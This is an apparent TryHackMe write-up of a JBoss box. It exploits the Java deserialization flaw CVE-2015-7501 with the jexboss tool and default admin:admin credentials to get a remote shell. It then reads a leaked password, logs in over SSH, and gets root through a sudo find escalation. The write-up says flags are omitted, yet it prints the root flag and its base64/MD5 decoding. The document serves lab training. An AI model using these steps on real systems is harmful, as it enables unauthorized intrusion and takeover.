## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Learn how to use a Java Serialisation attack in this boot-to-root
**Please allow up towards five minutes for this instance to fully boot - even as a subscribed member.** This is not a TryHackMe or AWS bottleneck, rather Java being Java and the web application taking time to fully initialise after boot.  
Your Instance IP Address: `10.201.58.68`
Deploying now and proceeding with the material below should allow for plenty of time for the instance to fully boot.
```

## IP-Address
```IP-Address
10.201.1.246
```

## RustScan
```bash
─$ rustscan -a 10.201.1.246  -b 450 -t 2000 --ulimit 5000 -- -e tun0  -p80
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.201.1.246:22
Open 10.201.1.246:80
Open 10.201.1.246:1091
Open 10.201.1.246:1090
Open 10.201.1.246:1099
Open 10.201.1.246:1098
Open 10.201.1.246:3873
Open 10.201.1.246:4446
Open 10.201.1.246:4713
Open 10.201.1.246:4712
Open 10.201.1.246:5445
Open 10.201.1.246:5455
Open 10.201.1.246:5500
Open 10.201.1.246:5501
Open 10.201.1.246:8009
Open 10.201.1.246:8080
Open 10.201.1.246:8083
```

On Port 8080
Found 
- Apache Tomcat/Coyote JSP engine 1.1
- Machine named `JBoss`

## Browser \
On the Blog page port 80 we found two images where 1 is 
- tiger 
- tiger hold cereals

in 2nd image blog said hint about the `tony loves cereals`
so we downloaded the image and checked his strings
```bash
└─$ strings be2sOV9.jpg | grep THM
[flag omitted]
'[flag omitted](dQ
```

## Vulnerability
```github Repo
https://github.com/joaomatosf/jexboss
```
#CVE-2015-7501
## Exploit
```bash
$git clone https://github.com/joao
$ ls
demo.png      jexboss_2025-09-05.log  jexcsv.py  myenv        README.md     screenshots  util
_exploits.py  jexboss.py              LICENSE    __pycache__  requires.txt  _updates.py
$ python3 -m venv myvenv
$ source /myvenv/bin/activate
$ pip install -r requirements.txt
$ python jexboss.py -J admin:admin -u http://10.201.1.246:8080 -r 10.201.1.246:8080 -t
Shell> ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz

Shell> ls -la /home
 Failed to check for updates
total 20
drwxr-xr-x  5 root    root    4096 Mar  6  2020 .
drwxr-xr-x 22 root    root    4096 Mar  4  2020 ..
drwxr-xr-x  5 cmnatic cmnatic 4096 Mar  7  2020 cmnatic
drwxr-xr-x  3 jboss   jboss   4096 Mar  7  2020 jboss
drwxr-xr-x  3 tony    tony    4096 Mar  6  2020 tony

Shell> ls -la /home/cmnatic
total 44
drwxr-xr-x 5 cmnatic cmnatic 4096 Mar  7  2020 .
drwxr-xr-x 5 root    root    4096 Mar  6  2020 ..
-rw------- 1 cmnatic cmnatic  126 Mar  7  2020 .Xauthority
-rw------- 1 cmnatic cmnatic 2816 Mar  7  2020 .bash_history
-rw-r--r-- 1 cmnatic cmnatic  220 Mar  4  2020 .bash_logout
-rw-r--r-- 1 cmnatic cmnatic 3672 Mar  4  2020 .bashrc
drwx------ 2 cmnatic cmnatic 4096 Mar  4  2020 .cache
drwx------ 3 cmnatic cmnatic 4096 Mar  4  2020 .config
-rw-r--r-- 1 cmnatic cmnatic  675 Mar  4  2020 .profile
drwxrwxr-x 8 cmnatic cmnatic 4096 Aug 16  2011 jboss
-rw-rw-r-- 1 cmnatic cmnatic  358 Mar  6  2020 to-do.txt

Shell> cat /home/cmnatic/to-do.txt
 Failed to check for updates
I like to keep a track of the various things I do throughout the day.

Things I have done today:
 - Added a note for JBoss to read for when he next logs in.
 - Helped Tony setup his website!
 - Made sure that I am not an administrator account 

Things to do:
 - Update my Java! I've heard it's kind of in-secure, but it's such a headache to update. Grrr!'
   
Shell> ls -la /home/jboss
 Failed to check for updates
total 36
drwxr-xr-x 3 jboss   jboss   4096 Mar  7  2020 .
drwxr-xr-x 5 root    root    4096 Mar  6  2020 ..
-rwxrwxrwx 1 jboss   jboss    181 Mar  7  2020 .bash_history
-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 jboss   jboss   3637 Mar  6  2020 .bashrc
drwx------ 2 jboss   jboss   4096 Mar  7  2020 .cache
-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note

Shell> cat /home/jboss/note
 Failed to check for updates
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don''t know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: [password omitted]
Kind Regards,
CMNatic
```

## Credentials
```Credentials
SSH 
user : jboss
Password: [password omitted]
```

## SSH
```bash
$ ssh jboss@10.201.1.246
Password: [password omitted]
```

## USER Flag
```bash
jboss@thm-java-deserial:~$ ls -la
total 36
drwxr-xr-x 3 jboss   jboss   4096 Mar  7  2020 .
drwxr-xr-x 5 root    root    4096 Mar  6  2020 ..
-rwxrwxrwx 1 jboss   jboss    181 Mar  7  2020 .bash_history
-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 jboss   jboss   3637 Mar  6  2020 .bashrc
drwx------ 2 jboss   jboss   4096 Mar  7  2020 .cache
-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note
-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
jboss@thm-java-deserial:~$ cat .jboss.txt
[flag omitted]
jboss@thm-java-deserial:~$ 
```
#### Flag
```Flag
[flag omitted]
```

## Privilege Escalation
```bash
jboss@thm-java-deserial:~$ sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```
Then we Search for the Find privilege escalation on gftbin
```bash
find . -exec /bin/sh \; -quit
```
Then Executes it with `sudo` as we can run `Find` as `sudo` 
```bash
jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
# cat /root/root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
```

After Discovering the content of the file `/root/root.txt`
we found out its a `base64` and found out it can be decode as
```cipher & decode
Cipher: QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
Decode: BC77AC072EE30E3760806864E234C7CF
```
This is and `MD5` hash which is 
```MD5 
MD5   : BC77AC072EE30E3760806864E234C7CF
Decode: zxcvbnm123456789
```
## ROOT Flag
```Flag
zxcvbnm123456789
```

# END